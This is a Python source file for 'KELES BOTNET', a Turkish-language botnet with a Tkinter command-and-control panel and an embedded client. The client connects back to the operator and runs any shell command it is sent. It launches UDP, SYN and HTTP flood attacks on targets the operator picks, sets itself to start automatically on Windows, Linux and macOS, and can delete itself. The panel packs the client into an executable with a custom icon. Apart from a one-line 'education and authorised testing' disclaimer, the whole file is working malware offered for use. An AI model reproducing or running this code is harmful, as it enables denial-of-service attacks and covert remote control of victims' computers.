#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KELES BOTNET - Gelişmiş Botnet Yönetim Paneli
Platform: Windows / Linux / macOS
Sürüm: v1.0 (BETA)
"""

import os
import sys
import socket
import threading
import time
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, filedialog, scrolledtext
from datetime import datetime

VERSION = "v1.0 (BETA)"
BRAND = "KELES BOTNET"
DEFAULT_PORT = 1000
ABOUT_FILE = "about.txt"

KELES_BANNER = r"""
 _  __     ______   __       _____   _____        ____    _____   _   _   _____   _____ 
| |/ /    |  ____| |  |     / ____| / ____|      |  _ \  |  __ \ | \ | | |  __ \ |_   _|
| ' /     | |__    |  |    | |  __ | (___        | |_) | | |__) ||  \| | | |  | |  | |  
|  <      |  __|   |  |    | | |_ |  \___ \      |  _ <  |  ___/ |     | | |  | |  | |  
| . \     | |____  |  |___ | |__| |  ____) |     | |_) | | |     | |\  | | |__| |  | |  
|_|\_\    |______| |______| \_____| |_____/      |____/  |_|     |_| \_| |_____/  |_|  
"""

DOS_BANNER = """
    _____  _____  _______ _______ 
   |     \|     \|       |     __|
   |  --  |  --  |   -   |__     |
   |_____/|_____/|_______|_______|
"""

CC_BANNER = """
             ______ ______ 
            |      |      |
            |   ---|   ---|
            |______|______|
"""

def load_about_text():
    """Hakkında yazısını about.txt'den okur, yoksa varsayılanı kullanır."""
    if os.path.exists(ABOUT_FILE):
        try:
            with open(ABOUT_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
        except:
            pass
    return f"{BRAND}\nSürüm: {VERSION}\n\nGeliştirici: (about.txt dosyasına kendi bilgilerinizi ekleyin)\n\nBu araç yalnızca eğitim ve yetkili test amaçlıdır."


class KelesServer:
    def __init__(self, host="0.0.0.0", port=DEFAULT_PORT):
        self.host = host
        self.port = port
        self.server = None
        self.clients = {}         
        self.client_ips = set()
        self.server_running = False
        self.log_messages = []    
        self.check_client_file()
        self.create_gui()
    def check_client_file(self):
        if not os.path.exists("client-create.txt"):
            with open("client-create.txt", "w", encoding="utf-8") as f:
                f.write(self.get_client_code())

    def get_client_code(self):
        """Çapraz platform destekli istemci kodu (Linux, Windows, macOS)"""
        return r'''# KELES BOTNET - İstemci
import os, sys, time, socket, threading, random, subprocess, platform, struct

SERVER_IP = '127.0.0.1'
SERVER_PORT = 1000
AUTO_START = False

import requests
from requests.exceptions import RequestException

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

exit_flag = False

def cc(url, threads_num, interval, custom_headers=None):
    global exit_flag
    exit_flag = False
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }
    if custom_headers:
        for pair in custom_headers.split():
            if ':' in pair:
                k, v = pair.split(':', 1)
                headers[k.strip()] = v.strip()
    def worker(url, headers, interval):
        while not exit_flag:
            try:
                time.sleep(random.uniform(0.1, 0.5))
                r = requests.get(url, headers=headers, timeout=10, verify=False)
                if random.random() < 0.3:
                    print(f"[{threading.current_thread().name}] Durum: {r.status_code}")
            except:
                time.sleep(1)
            time.sleep(max(0.1, interval * random.uniform(0.8, 1.2)))
    try:
        for i in range(START_TIME := 5, 0, -1):
            time.sleep(1)
    except KeyboardInterrupt:
        return
    threads = []
    for i in range(threads_num):
        t = threading.Thread(target=worker, args=(url, headers, interval), daemon=True)
        t.start()
        threads.append(t)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        exit_flag = True
        for t in threads:
            t.join(2)

def dos(ip, ports, packet_types, threads):
    family = socket.AF_INET6 if ':' in ip else socket.AF_INET
    counter = 0
    lock = threading.Lock()
    running = True
    sockets = []

    def create_syn_packet():
        src_port = random.randint(1024, 65535)
        dst_port = random.choice(ports)
        tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port,
                                 random.randint(0, 4294967295), 0, 5 << 4, 0x02,
                                 socket.htons(5840), 0, 0)
        return tcp_header

    def create_udp_packet():
        return random._urandom(1490)

    def attack_port(port):
        nonlocal counter
        try:
            sock_type = socket.SOCK_DGRAM if 'udp' in packet_types else socket.SOCK_RAW
            sock = socket.socket(family, sock_type)
            sockets.append(sock)
            while running:
                for ptype in packet_types:
                    if ptype == 'udp':
                        sock.sendto(create_udp_packet(), (ip, port))
                    elif ptype == 'syn':
                        sock.sendto(create_syn_packet(), (ip, port))
                    with lock:
                        counter += 1
                time.sleep(0)
        except:
            pass

    threads_per_port = max(1, threads // len(ports))
    for port in ports:
        for _ in range(threads_per_port):
            threading.Thread(target=attack_port, args=(port,), daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        for sock in sockets:
            sock.close()
        print(f"\nToplam {counter} paket gönderildi")

def auto_start():
    if not AUTO_START:
        return
    try:
        if platform.system() == 'Windows':
            import shutil
            startup = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            os.makedirs(startup, exist_ok=True)
            shutil.copy2(sys.argv[0], os.path.join(startup, os.path.basename(sys.argv[0])))
        elif platform.system() == 'Linux':
            autostart = os.path.expanduser('~/.config/autostart')
            os.makedirs(autostart, exist_ok=True)
            with open(os.path.join(autostart, 'keles_client.desktop'), 'w') as f:
                f.write(f"[Desktop Entry]\nType=Application\nName=KelesClient\nExec={sys.argv[0]}\nX-GNOME-Autostart-enabled=true\n")
        elif platform.system() == 'Darwin':  # macOS
            launch_agents = os.path.expanduser('~/Library/LaunchAgents')
            os.makedirs(launch_agents, exist_ok=True)
            plist = f'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n<key>Label</key>\n<string>com.keles.client</string>\n<key>ProgramArguments</key>\n<array>\n<string>{sys.argv[0]}</string>\n</array>\n<key>RunAtLoad</key>\n<true/>\n</dict>\n</plist>'
            with open(os.path.join(launch_agents, 'com.keles.client.plist'), 'w') as f:
                f.write(plist)
    except:
        pass

def delete_self():
    try:
        if platform.system() == 'Windows':
            startup = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            target = os.path.join(startup, os.path.basename(sys.argv[0]))
            if os.path.exists(target):
                os.remove(target)
        elif platform.system() == 'Linux':
            desktop = os.path.expanduser('~/.config/autostart/keles_client.desktop')
            if os.path.exists(desktop):
                os.remove(desktop)
        elif platform.system() == 'Darwin':
            plist = os.path.expanduser('~/Library/LaunchAgents/com.keles.client.plist')
            if os.path.exists(plist):
                os.remove(plist)
        script = sys.argv[0]
        if platform.system() == 'Windows':
            subprocess.Popen(['cmd', '/c', f'timeout /t 2 & del /f /q "{script}"'], shell=True)
        else:
            subprocess.Popen(['/bin/bash', '-c', f'sleep 1 && rm -f "{script}"'], start_new_session=True)
        sys.exit(0)
    except:
        sys.exit(1)

def connect_to_server():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((SERVER_IP, SERVER_PORT))
            print(f"[+] Bağlandı: {SERVER_IP}:{SERVER_PORT}")
            while True:
                try:
                    sock.settimeout(30)
                    cmd = sock.recv(4096)
                    if not cmd:
                        break
                    cmd = cmd.decode('utf-8', errors='replace')
                    if cmd.strip() == 'delete_self':
                        delete_self()
                    result = execute(cmd)
                    sock.send(result.encode('utf-8', errors='replace'))
                except socket.timeout:
                    continue
                except:
                    break
            sock.close()
        except:
            pass
        time.sleep(5)

def execute(cmd):
    try:
        if cmd.startswith('dos'):
            parts = cmd.split()
            if len(parts) >= 5:
                dos(parts[2], parts[3].split(','), parts[1], int(parts[4]))
                return f"DOS başlatıldı -> {parts[2]}:{parts[3]}"
        elif cmd.startswith('cc'):
            parts = cmd.split()
            if len(parts) >= 3:
                headers = ' '.join(parts[3:]).replace('_', ' ') if len(parts) > 3 else None
                cc(parts[1], int(parts[2]), 0, headers)
                return f"CC başlatıldı -> {parts[1]}"
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout or "Tamam"
    except Exception as e:
        return f"Hata: {e}"
    return "Komut tanınamadı"

if __name__ == '__main__':
    auto_start()
    connect_to_server()
'''

    def create_gui(self):
        self.root = tk.Tk()
        self.root.title(f"{BRAND} - Yönetim Paneli")
        self.root.geometry("1000x700")
        self.root.minsize(800, 600)
        self.setup_styles()
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        banner_frame = ttk.Frame(main_frame)
        banner_frame.pack(fill=tk.X, pady=(0, 10))
        banner_label = ttk.Label(banner_frame, text=KELES_BANNER, font=("Courier", 10, "bold"), anchor=tk.CENTER)
        banner_label.pack()
        toolbar = ttk.Frame(main_frame)
        toolbar.pack(fill=tk.X, pady=5)
        self.start_btn = ttk.Button(toolbar, text="▶ Sunucuyu Başlat", command=self.start_server, width=20)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="📦 İstemci Oluştur", command=self.create_client_dialog).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="🧹 Temizle", command=self.clear_log).pack(side=tk.LEFT, padx=5)
        paned = ttk.PanedWindow(main_frame, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True, pady=5)
        left_frame = ttk.LabelFrame(paned, text="Bağlı İstemciler", padding=5)
        paned.add(left_frame, weight=1)

        columns = ("IP Adresi", "Port", "Bağlantı Zamanı", "Durum")
        self.client_tree = ttk.Treeview(left_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.client_tree.heading(col, text=col)
            self.client_tree.column(col, width=120, anchor=tk.CENTER)
        self.client_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        tree_scroll = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=self.client_tree.yview)
        self.client_tree.configure(yscroll=tree_scroll.set)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        right_frame = ttk.LabelFrame(paned, text="Olay Günlüğü", padding=5)
        paned.add(right_frame, weight=1)

        self.log_area = scrolledtext.ScrolledText(right_frame, wrap=tk.WORD, state=tk.DISABLED,
                                                  font=("Consolas", 9), bg="#1e1e1e", fg="#00ff00")
        self.log_area.pack(fill=tk.BOTH, expand=True)
        client_btn_frame = ttk.Frame(main_frame)
        client_btn_frame.pack(fill=tk.X, pady=5)
        ttk.Button(client_btn_frame, text="🗑 Sil", command=self.delete_client).pack(side=tk.LEFT, padx=5)
        ttk.Button(client_btn_frame, text="✂ Bağlantıyı Kes", command=self.disconnect_client).pack(side=tk.LEFT, padx=5)
        ttk.Button(client_btn_frame, text="🔄 Yenile", command=self.refresh_clients).pack(side=tk.LEFT, padx=5)
        attack_frame = ttk.Frame(main_frame)
        attack_frame.pack(fill=tk.X, pady=5)
        ttk.Button(attack_frame, text="💣 DOS Saldırısı", command=self.show_dos_dialog).pack(side=tk.LEFT, padx=5)
        ttk.Button(attack_frame, text="🌊 CC Saldırısı", command=self.show_cc_dialog).pack(side=tk.LEFT, padx=5)
        cmd_frame = ttk.LabelFrame(main_frame, text="Hızlı Komut", padding=5)
        cmd_frame.pack(fill=tk.X, pady=5)
        self.cmd_entry = ttk.Entry(cmd_frame, font=("Courier", 10))
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.cmd_entry.bind("<Return>", lambda e: self.send_command())
        ttk.Button(cmd_frame, text="Gönder", command=self.send_command).pack(side=tk.RIGHT, padx=5)
        self.status_var = tk.StringVar(value="Sunucu durduruldu - İstemci: 0")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        self.create_menu()

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use("clam")
        bg_color = "#2b2b2b"
        fg_color = "#dcdcdc"
        self.root.configure(bg=bg_color)
        style.configure("TFrame", background=bg_color)
        style.configure("TLabel", background=bg_color, foreground=fg_color)
        style.configure("TButton", background="#3c3c3c", foreground=fg_color)
        style.map("TButton", background=[("active", "#505050")])
        style.configure("TLabelframe", background=bg_color, foreground=fg_color)
        style.configure("TLabelframe.Label", background=bg_color, foreground=fg_color)
        style.configure("TEntry", fieldbackground="#3c3c3c", foreground=fg_color)

    def create_menu(self):
        menubar = tk.Menu(self.root)
        settings_menu = tk.Menu(menubar, tearoff=0)
        settings_menu.add_command(label="Dinleme IP'si", command=self.change_ip)
        settings_menu.add_command(label="Dinleme Portu", command=self.change_port)
        menubar.add_cascade(label="Ayarlar", menu=settings_menu)
        help_menu = tk.Menu(menubar, tearoff=0)
        help_menu.add_command(label="Hakkında", command=self.show_about)
        menubar.add_cascade(label="Yardım", menu=help_menu)
        self.root.config(menu=menubar)
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] {message}\n"
        self.log_area.configure(state=tk.NORMAL)
        self.log_area.insert(tk.END, line)
        self.log_area.see(tk.END)
        self.log_area.configure(state=tk.DISABLED)

    def clear_log(self):
        self.log_area.configure(state=tk.NORMAL)
        self.log_area.delete(1.0, tk.END)
        self.log_area.configure(state=tk.DISABLED)
    def start_server(self):
        if self.server_running:
            self.stop_server()
            self.start_btn.config(text="▶ Sunucuyu Başlat")
            return
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(10)
            self.server_running = True
            self.start_btn.config(text="⏹ Sunucuyu Durdur")
            self.log(f"Sunucu başlatıldı: {self.host}:{self.port}")
            threading.Thread(target=self.accept_clients, daemon=True).start()
        except Exception as e:
            messagebox.showerror("Hata", f"Sunucu başlatılamadı: {e}")

    def stop_server(self):
        self.server_running = False
        for client in list(self.clients.values()):
            try:
                client.close()
            except:
                pass
        self.clients.clear()
        self.client_ips.clear()
        self.refresh_clients()
        if self.server:
            self.server.close()
        self.log("Sunucu durduruldu")

    def accept_clients(self):
        while self.server_running:
            try:
                client, addr = self.server.accept()
                ip, port = addr
                if ip in self.client_ips:
                    client.close()
                    continue
                self.client_ips.add(ip)
                self.clients[ip] = client
                self.log(f"Yeni istemci: {ip}:{port}")
                self.refresh_clients()
                threading.Thread(target=self.handle_client, args=(client, ip), daemon=True).start()
            except:
                if self.server_running:
                    break

    def handle_client(self, client, ip):
        while self.server_running:
            try:
                msg = client.recv(4096)
                if not msg:
                    break
                self.log(f"{ip} → {msg.decode('utf-8', errors='ignore')}")
            except:
                break
        self.remove_client(ip)

    def remove_client(self, ip):
        if ip in self.clients:
            try:
                self.clients[ip].close()
            except:
                pass
            del self.clients[ip]
            self.client_ips.discard(ip)
            self.log(f"İstemci ayrıldı: {ip}")
            self.refresh_clients()

    def refresh_clients(self):
        for row in self.client_tree.get_children():
            self.client_tree.delete(row)
        for ip, sock in self.clients.items():
            try:
                sock.send(b'')
                status = "Aktif"
                conn_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            except:
                status = "Koptu"
                conn_time = "?"
            self.client_tree.insert("", tk.END, values=(ip, sock.getpeername()[1], conn_time, status))
        self.status_var.set(f"{'Çalışıyor' if self.server_running else 'Durdu'} - İstemci: {len(self.clients)}")

    def delete_client(self):
        selected = self.client_tree.selection()
        if not selected:
            messagebox.showinfo("Bilgi", "Lütfen istemci seçin.")
            return
        for item in selected:
            ip = self.client_tree.item(item, "values")[0]
            if ip in self.clients:
                try:
                    self.clients[ip].send(b"delete_self")
                except:
                    pass
                self.remove_client(ip)
        self.log(f"{len(selected)} istemciye silme komutu gönderildi")

    def disconnect_client(self):
        selected = self.client_tree.selection()
        if not selected:
            messagebox.showinfo("Bilgi", "Lütfen istemci seçin.")
            return
        for item in selected:
            ip = self.client_tree.item(item, "values")[0]
            if ip in self.clients:
                self.remove_client(ip)

    def send_command(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        for ip, sock in list(self.clients.items()):
            try:
                sock.send(cmd.encode('utf-8'))
            except:
                self.remove_client(ip)
        self.log(f"Komut gönderildi ({len(self.clients)} istemci): {cmd}")
        self.cmd_entry.delete(0, tk.END)
    def show_dos_dialog(self):
        win = tk.Toplevel(self.root)
        win.title("DOS Saldırısı")
        win.geometry("420x300")
        win.resizable(False, False)
        win.configure(bg="#2b2b2b")

        ttk.Label(win, text="Protokol:").pack(anchor=tk.W, padx=10, pady=5)
        proto_var = tk.StringVar(value="udp")
        ttk.Radiobutton(win, text="UDP", variable=proto_var, value="udp").pack(anchor=tk.W, padx=20)
        ttk.Radiobutton(win, text="SYN (root gerekir)", variable=proto_var, value="syn").pack(anchor=tk.W, padx=20)

        ttk.Label(win, text="Hedef IP:").pack(anchor=tk.W, padx=10, pady=5)
        ip_entry = ttk.Entry(win, width=30)
        ip_entry.pack(anchor=tk.W, padx=10)

        ttk.Label(win, text="Portlar (örn: 80,443):").pack(anchor=tk.W, padx=10, pady=5)
        port_entry = ttk.Entry(win, width=30)
        port_entry.pack(anchor=tk.W, padx=10)

        ttk.Label(win, text="Thread Sayısı:").pack(anchor=tk.W, padx=10, pady=5)
        thread_entry = ttk.Entry(win, width=30)
        thread_entry.insert(0, "100")
        thread_entry.pack(anchor=tk.W, padx=10)

        def start_dos():
            if not ip_entry.get() or not port_entry.get():
                messagebox.showerror("Hata", "IP ve port zorunludur.")
                return
            cmd = f"dos {proto_var.get()} {ip_entry.get()} {port_entry.get()} {thread_entry.get()}"
            for ip, sock in list(self.clients.items()):
                try:
                    sock.send(cmd.encode('utf-8'))
                except:
                    self.remove_client(ip)
            self.log(f"DOS başlatıldı → {ip_entry.get()}:{port_entry.get()}")
            win.destroy()

        ttk.Button(win, text="Başlat", command=start_dos).pack(pady=15)

    def show_cc_dialog(self):
        win = tk.Toplevel(self.root)
        win.title("CC Saldırısı")
        win.geometry("420x340")
        win.resizable(False, False)
        win.configure(bg="#2b2b2b")

        ttk.Label(win, text="Hedef URL:").pack(anchor=tk.W, padx=10, pady=5)
        url_entry = ttk.Entry(win, width=40)
        url_entry.pack(anchor=tk.W, padx=10)

        ttk.Label(win, text="Thread Sayısı:").pack(anchor=tk.W, padx=10, pady=5)
        thread_entry = ttk.Entry(win, width=20)
        thread_entry.insert(0, "50")
        thread_entry.pack(anchor=tk.W, padx=10)

        ttk.Label(win, text="Özel Başlık (opsiyonel, boşluklar alt çizgiyle):").pack(anchor=tk.W, padx=10, pady=5)
        header_entry = ttk.Entry(win, width=40)
        header_entry.pack(anchor=tk.W, padx=10)

        use_default = tk.BooleanVar(value=True)
        ttk.Checkbutton(win, text="Varsayılan başlık kullan", variable=use_default).pack(anchor=tk.W, padx=20, pady=5)

        def start_cc():
            if not url_entry.get():
                messagebox.showerror("Hata", "URL zorunludur.")
                return
            headers = "" if use_default.get() else header_entry.get().replace('_', ' ')
            cmd = f"cc {url_entry.get()} {thread_entry.get()} {headers}"
            for ip, sock in list(self.clients.items()):
                try:
                    sock.send(cmd.encode('utf-8'))
                except:
                    self.remove_client(ip)
            self.log(f"CC başlatıldı → {url_entry.get()}")
            win.destroy()

        ttk.Button(win, text="Başlat", command=start_cc).pack(pady=15)
    def create_client_dialog(self):
        win = tk.Toplevel(self.root)
        win.title("İstemci Oluştur")
        win.geometry("420x380")
        win.resizable(False, False)
        win.configure(bg="#2b2b2b")

        ttk.Label(win, text="Sunucu IP:").pack(anchor=tk.W, padx=10, pady=5)
        ip_entry = ttk.Entry(win, width=30)
        ip_entry.insert(0, self.host)
        ip_entry.pack(anchor=tk.W, padx=10)

        ttk.Label(win, text="Sunucu Port:").pack(anchor=tk.W, padx=10, pady=5)
        port_entry = ttk.Entry(win, width=30)
        port_entry.insert(0, str(self.port))
        port_entry.pack(anchor=tk.W, padx=10)

        auto_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(win, text="Başlangıçta otomatik başlat", variable=auto_var).pack(anchor=tk.W, padx=20, pady=5)

        ttk.Label(win, text="Simge (opsiyonel):").pack(anchor=tk.W, padx=10, pady=5)
        icon_frame = ttk.Frame(win)
        icon_frame.pack(fill=tk.X, padx=10)
        icon_entry = ttk.Entry(icon_frame, width=25)
        icon_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)
        ttk.Button(icon_frame, text="...", command=lambda: self.browse_file(icon_entry)).pack(side=tk.RIGHT)

        ttk.Label(win, text="Çıktı Klasörü:").pack(anchor=tk.W, padx=10, pady=5)
        out_frame = ttk.Frame(win)
        out_frame.pack(fill=tk.X, padx=10)
        out_entry = ttk.Entry(out_frame, width=25)
        out_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)
        ttk.Button(out_frame, text="...", command=lambda: self.browse_folder(out_entry)).pack(side=tk.RIGHT)

        def build():
            if not ip_entry.get() or not port_entry.get() or not out_entry.get():
                messagebox.showerror("Hata", "Zorunlu alanları doldurun.")
                return
            try:
                import PyInstaller
            except ImportError:
                messagebox.showerror("Hata", "PyInstaller yüklü değil. 'pip install pyinstaller' ile kurun.")
                return
            try:
                with open("client-create.txt", "r") as f:
                    code = f.read()
                code = code.replace("SERVER_IP = '127.0.0.1'", f"SERVER_IP = '{ip_entry.get()}'")
                code = code.replace("SERVER_PORT = 1000", f"SERVER_PORT = {port_entry.get()}")
                code = code.replace("AUTO_START = False", f"AUTO_START = {auto_var.get()}")
                os.makedirs("BOTNET-Script", exist_ok=True)
                py_file = os.path.join("BOTNET-Script", f"client_{ip_entry.get()}_{port_entry.get()}.py")
                with open(py_file, "w") as f:
                    f.write(code)
                messagebox.showwarning("Paketleme", "PyInstaller çalışıyor, lütfen bekleyin...")
                cmd = ["pyinstaller", "--onefile", "--distpath", out_entry.get()]
                if icon_entry.get():
                    cmd.extend(["--icon", icon_entry.get()])
                cmd.append(py_file)
                subprocess.run(cmd)
                messagebox.showinfo("Başarılı", f"İstemci oluşturuldu:\n{out_entry.get()}")
                win.destroy()
            except Exception as e:
                messagebox.showerror("Hata", str(e))

        ttk.Button(win, text="Oluştur", command=build).pack(pady=15)

    def browse_file(self, entry):
        path = filedialog.askopenfilename()
        if path:
            entry.delete(0, tk.END)
            entry.insert(0, path)

    def browse_folder(self, entry):
        path = filedialog.askdirectory()
        if path:
            entry.delete(0, tk.END)
            entry.insert(0, path)

    def change_ip(self):
        if self.server_running:
            messagebox.showerror("Hata", "Önce sunucuyu durdurun.")
            return
        ip = simpledialog.askstring("IP Ayarla", "Yeni IP:", initialvalue=self.host)
        if ip:
            self.host = ip

    def change_port(self):
        if self.server_running:
            messagebox.showerror("Hata", "Önce sunucuyu durdurun.")
            return
        port = simpledialog.askinteger("Port Ayarla", "Yeni Port:", initialvalue=self.port, minvalue=1, maxvalue=65535)
        if port:
            self.port = port

    def show_about(self):
        messagebox.showinfo(f"{BRAND} Hakkında", load_about_text())


if __name__ == "__main__":
    app = KelesServer(host="0.0.0.0", port=DEFAULT_PORT)
    app.root.mainloop()
